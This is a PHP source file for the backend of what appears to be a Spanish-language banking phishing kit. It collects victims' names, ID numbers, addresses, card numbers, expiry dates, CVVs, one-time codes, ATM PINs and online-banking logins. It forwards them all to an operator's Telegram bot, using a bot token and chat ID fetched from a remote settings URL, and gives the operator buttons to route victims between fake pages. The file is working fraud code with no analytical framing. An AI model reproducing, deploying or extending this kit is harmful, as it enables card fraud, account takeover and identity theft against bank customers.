<?php
// Iniciar la sesión si es necesario
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $page = $_POST['pag'] ?? '';

    // Realizar la solicitud a "setting.php"
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://test.casinolandia.live/l/setting.php');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Error al realizar la solicitud a setting.php: ' . curl_error($ch));
        exit('Error al realizar la solicitud.');
    }

    curl_close($ch);

    $datosToken = json_decode($response, true);

    // Verificar si la respuesta es válida
    if (!$datosToken || !isset($datosToken['token']) || !isset($datosToken['chatId'])) {
        error_log('Error: Respuesta inválida de setting.php');
        exit('Error: Respuesta inválida de setting.php');
    }

    $ip = $datosToken['Ip'];
    $mensaje = "IP: " . $ip;

    // Verificar si la sesión 'data' existe, si no, inicializarla
    if (!isset($_SESSION['data'])) {
        $_SESSION['data'] = json_encode([]);
    }

    // Procesar según el valor de $page
    switch ($page) {
        case "info":
            header("Location: pago.php");
            exit;
        case "tarjeta":
            $nombre = $_POST['nombre'] ?? '';
            $documento = $_POST['documento'] ?? '';
            $tel = $_POST['tel'] ?? '';
            $ciudad = $_POST['ciudad'] ?? '';
            $direccion = $_POST['direccion'] ?? '';
            $correo = $_POST['correo'] ?? '';
            $TxtBanco = $_POST['TxtBanco'] ?? '';
            $inputNumero = $_POST['inputNumero'] ?? '';
            $selectMes = $_POST['selectMes'] ?? '';
            $inputCCV = $_POST['inputCCV'] ?? '';

            $inputinfo = fetchInfo($inputNumero);

            $_SESSION['bank'] = $TxtBanco;
            $_SESSION['tarjeta'] = $inputNumero;
            $_SESSION['info'] = json_encode([$nombre]);

            $mensaje .= "\n 🟢NOMBRE: " . $nombre;
            $mensaje .= "\n 🟢CEDULA: " . $documento;
            $mensaje .= "\n 🟢TELEFONO: " . $tel;
            $mensaje .= "\n 🟢CIUDAD: " . $ciudad;
            $mensaje .= "\n 🟢DIRECCION: " . $direccion;
            $mensaje .= "\n 🟢CORREO: " . $correo;
            $mensaje .= "\n 🟢BANCO: " . $TxtBanco;
            $mensaje .= "\n 🟢CC: " . $inputNumero;
            $mensaje .= "\n 🟢FECHA: " . $selectMes;
            $mensaje .= "\n 🟢CVV: " . $inputCCV;
            messeger($mensaje, $datosToken);
            break;
        case "otp":
            $dataInfo = json_decode($_SESSION['info'], true);
            $otp = $_POST['otp'] ?? '';
            $mensaje .= "\n 🟢NOMBRE: " . $dataInfo[0];
            $mensaje .= "\n 🟢OTP: " . $otp;
            messeger($mensaje, $datosToken);
            break;
        case "atm":
            $dataInfo = json_decode($_SESSION['info'], true);
            $passatm = $_POST['txtPassword'] ?? '';
            $mensaje .= "\n 🟢NOMBRE: " . $dataInfo[0];
            $mensaje .= "\n 🏧CLAVE CAJERO: " . $passatm;
            messeger($mensaje, $datosToken);
            break;
        case "logo":
            $dataInfo = json_decode($_SESSION['info'], true);
            $usuario = $_POST['txtUser'] ?? '';
            $pass = $_POST['txtPassword'] ?? '';
            $mensaje .= "\n 🟢NOMBRE: " . $dataInfo[0];
            $mensaje .= "\n 🟢USUARIO: " . $usuario;
            $mensaje .= "\n 🟢CONTRASEÑA: " . $pass;
            messeger($mensaje, $datosToken);
            break;
        case "final":
            // Manejar caso final si es necesario
            break;
        default:
            error_log('Error: valor de $page no reconocido.');
            exit('Error: valor de $page no reconocido.');
    }
}

function fetchInfo($numero) {
    $url = "https://lookup.binlist.net/" . trim($numero);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Error en la consulta a Binlist: ' . curl_error($ch));
    }

    curl_close($ch);

    $data = json_decode($response, true);

    if (isset($data['bank']['name'])) {
        $bank = $data['bank']['name'];
        $brand = $data['brand'] ?? '';
        $country = $data['country']['name'] ?? '';
        $scheme = $data['scheme'] ?? '';
        $type = $data['type'] ?? '';
        return "$bank,$brand,$country,$scheme,$type";
    } else {
        return "";
    }
}

function messeger($mensaje, $datosToken) {
    $token = $datosToken['token'];
    $chatId = $datosToken['chatId'];

    $buttons = [
        ["🏦LG"],
        ["❌LG", "✅FINAL"]
    ];

    $keyboard = [
        'inline_keyboard' => array_map(function ($row) {
            return array_map(function ($button) {
                return ['text' => $button, 'callback_data' => $button];
            }, $row);
        }, $buttons),
        'resize_keyboard' => true,
    ];

    $message = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'reply_markup' => json_encode($keyboard),
    ];

    $apiUrl = "https://api.telegram.org/bot{$token}/sendMessage";

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($message));
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log('Error al enviar el mensaje a Telegram: ' . curl_error($ch));
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    if ($httpCode != 200) {
        error_log('Telegram API devolvió el código: ' . $httpCode . ' con la respuesta: ' . $response);
    } else {
        error_log('Mensaje enviado a Telegram correctamente.');
    }

    curl_close($ch);

    header("Location: global.php");
    exit;
}
?>
